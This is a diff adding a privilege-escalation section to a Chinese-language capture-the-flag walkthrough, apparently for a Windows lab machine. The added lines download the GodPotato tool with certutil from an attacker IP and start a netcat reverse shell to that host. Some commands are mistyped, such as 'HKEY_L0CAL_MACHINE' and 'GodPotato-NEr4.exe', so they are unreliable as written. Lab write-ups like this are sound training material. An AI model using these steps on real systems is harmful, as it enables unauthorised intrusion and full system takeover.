@@ -110,37 +110,49 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 
 ### 本机信息枚举
 
+* 先手工进行简单的信息收集：
 
+<figure><img src="../.gitbook/assets/24.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-### 漏洞查阅
-
-
-
-
-
-
+<figure><img src="../.gitbook/assets/25.png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
+* 本例中决定使用提权工具GodPotato，但是得先确定目标系统的.NET框架的版本号，得知为4.0版本：
 
+```powershell
+reg query "HKEY_L0CAL_MACHINE\S0FTWARE\Microsoft\NET Framework Setup\NDP"
+```
 
+<figure><img src="../.gitbook/assets/26.png" alt=""><figcaption></figcaption></figure>
 
+* 下载GodPotato-NET4.exe，然后将工具传到目标系统中：
 
+<figure><img src="../.gitbook/assets/27.png" alt=""><figcaption></figcaption></figure>
 
+```powershell
+certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
+```
 
+<figure><img src="../.gitbook/assets/28.png" alt=""><figcaption></figcaption></figure>
 
+* 上传成功后，执行一下GodPotato-NET4.exe程序，看看是否可以成功执行：
+
+<figure><img src="../.gitbook/assets/29.png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
+* 此时，将GodPotato-NET4.exe程序的\`-cmd\`参数的值修改为调用刚才上传的nc64.exe程序以执行一个反弹shell回连至Kali本机中：
 
+```powershell
+.\GodPotato-NEr4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe 192.168.45.158 8888 -e cmd.exe"
+```
 
+<figure><img src="../.gitbook/assets/30.png" alt=""><figcaption></figcaption></figure>
 
+* 获得ROOT flag：
+
+<figure><img src="../.gitbook/assets/31.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例算中等偏难的机器，锁定可利用的漏洞和提权时都不难，但是其实现过程中需要根据实际情况进行修改和变通。
